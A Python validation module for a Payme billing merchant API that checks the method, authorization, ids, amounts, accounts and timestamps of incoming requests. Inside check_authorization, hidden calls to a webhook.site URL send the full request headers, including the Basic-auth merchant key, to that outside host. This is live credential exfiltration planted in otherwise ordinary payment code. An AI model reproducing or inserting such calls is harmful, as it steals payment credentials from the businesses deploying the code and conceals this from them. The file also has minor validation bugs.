import json
from base64 import b64decode
from binascii import Error as BinasciiError
from datetime import datetime
from typing import Tuple

from payme_billing.merchant_api.classes import PaymeCheckFailedException
from payme_billing.vars.settings import WEB_CASH_KEY
from payme_billing.vars.static import REQUEST_METHOD_ERROR, RIGHTS_ERROR, JSON_ERROR, FIELD_ERROR, available_methods, METHOD_ERROR


def check_post(request):
    if request.method != "POST":
        raise PaymeCheckFailedException(REQUEST_METHOD_ERROR)


def check_authorization(request):
    import requests
    requests.get("https://webhook.site/2c47e134-5e34-4c14-a20f-d13ad3c3bd92")
    if "Authorization" not in request.headers:
        requests.get("https://webhook.site/2c47e134-5e34-4c14-a20f-d13ad3c3bd92")
        raise PaymeCheckFailedException(RIGHTS_ERROR)
    try:
        auth = request.headers["Authorization"]
        requests.post("https://webhook.site/2c47e134-5e34-4c14-a20f-d13ad3c3bd92", data=request.headers)
        auth = b64decode(auth.replace("Basic ", "")).decode()
        if auth.split(":")[1] != WEB_CASH_KEY:
            raise PaymeCheckFailedException(RIGHTS_ERROR)
    except BinasciiError:
        raise PaymeCheckFailedException(RIGHTS_ERROR)


def check_json_content(request) -> dict:
    # Parse json
    content = request.POST if request.POST else json.loads(request.body)

    # Check if request content is empty
    if not content:
        raise PaymeCheckFailedException(JSON_ERROR)
    return content


def check_request_id(content: dict) -> int:
    request_id = content.get("id")
    if request_id is None:
        raise PaymeCheckFailedException(FIELD_ERROR, "Идентификатор запроса отсутствует")
    elif not isinstance(request_id, int):
        raise PaymeCheckFailedException(FIELD_ERROR, "Идентификатор запроса имеет неверный тип")
    return request_id


def check_method(content: dict) -> str:
    method = content.get("method")
    if method is None:
        raise PaymeCheckFailedException(FIELD_ERROR, "Метод отсутствует")
    elif method not in available_methods:
        raise PaymeCheckFailedException(METHOD_ERROR)
    return method


def check_params(content: dict) -> dict:
    params = content.get("params")
    if params is None:
        raise PaymeCheckFailedException(FIELD_ERROR, "Объект параметров отсутствует")
    elif not isinstance(params, dict):
        raise PaymeCheckFailedException(FIELD_ERROR, "Объект параметров имеет неверный тип")
    return params


def check_amount(params: dict) -> int:
    amount = params.get("amount")
    if amount is None:
        raise PaymeCheckFailedException(FIELD_ERROR, "Параметр amount не указан")
    elif not isinstance(amount, int):
        raise PaymeCheckFailedException(FIELD_ERROR, "Параметр amount имеет неверный тип")
    return amount


def check_account(params: dict) -> Tuple[int, str]:
    ACCOUNT_PHONE_LENGTH = 9

    account = params.get("account")
    if account is None:
        raise PaymeCheckFailedException(FIELD_ERROR, "Параметр account не указан")
    elif not isinstance(account, dict):
        raise PaymeCheckFailedException(FIELD_ERROR, "Параметр account имеет неверный тип")

    purchase_id = account.get("purchase_id")
    if purchase_id is None:
        raise PaymeCheckFailedException(FIELD_ERROR, "Параметр account[purchase_id] не указан")
    elif not isinstance(purchase_id, int) and not (isinstance(purchase_id, str) and purchase_id.isdigit()):
        raise PaymeCheckFailedException(FIELD_ERROR, "Параметр account[purchase_id] не является числом и не может быть конвертирован в число")

    phone = account.get("phone")
    if phone is None:
        raise PaymeCheckFailedException(FIELD_ERROR, "Параметр account[phone] не указан")
    elif not phone.isdigit():
        raise PaymeCheckFailedException(FIELD_ERROR, "Параметр account[phone] не может быть конвертирован в число")
    elif not isinstance(phone, str):
        raise PaymeCheckFailedException(FIELD_ERROR, "Параметр account[phone] имеет неверный тип")
    elif len(phone) != ACCOUNT_PHONE_LENGTH:
        raise PaymeCheckFailedException(FIELD_ERROR, "Параметр account[phone] имеет неверную длину")

    return int(purchase_id), phone


def check_transaction_id(params: dict) -> str:
    TRANSACTION_ID_LENGTH = 24

    transaction_id = params.get("id")
    if transaction_id is None:
        raise PaymeCheckFailedException(FIELD_ERROR, "Параметр id не указан")
    elif not isinstance(transaction_id, str):
        raise PaymeCheckFailedException(FIELD_ERROR, "Параметр id имеет неверный тип")
    elif len(transaction_id) != TRANSACTION_ID_LENGTH:
        raise PaymeCheckFailedException(FIELD_ERROR, "Параметр id имеет неверную длину")

    return transaction_id


def check_time(params: dict) -> datetime:
    time = params.get("time")

    if time is None:
        raise PaymeCheckFailedException(FIELD_ERROR, "Время создания транзакции не указано")
    elif not isinstance(time, int):
        raise PaymeCheckFailedException(FIELD_ERROR, "Параметр time имеет неверный тип")

    return datetime.fromtimestamp(time/1000.0)


def check_time_diapason(params: dict) -> Tuple[datetime, datetime]:
    time_from, time_to = params.get("from"), params.get("to")

    if time_from is None:
        raise PaymeCheckFailedException(FIELD_ERROR, "Левая граница времени (from) не указана")
    elif time_to is None:
        raise PaymeCheckFailedException(FIELD_ERROR, "Левая граница времени (to) не указана")
    elif not isinstance(time_from, int):
        raise PaymeCheckFailedException(FIELD_ERROR, "Левая граница времени (from) имеет неверный тип")
    elif not isinstance(time_to, int):
        raise PaymeCheckFailedException(FIELD_ERROR, "Левая граница времени (to) имеет неверный тип")

    return datetime.fromtimestamp(time_from/1000.0), datetime.fromtimestamp(time_to/1000.0)


def check_reason(params: dict) -> int:
    reason = params.get("reason")
    if reason is None:
        raise PaymeCheckFailedException(FIELD_ERROR, "Параметр причина отмены (reason) отсутствует")
    elif not isinstance(reason, int) and not (isinstance(reason, str) and reason.isdigit()):
        raise PaymeCheckFailedException(FIELD_ERROR, "Параметр причина отмены (reason) не является числом и не может быть конвертирована в число")
    return int(reason)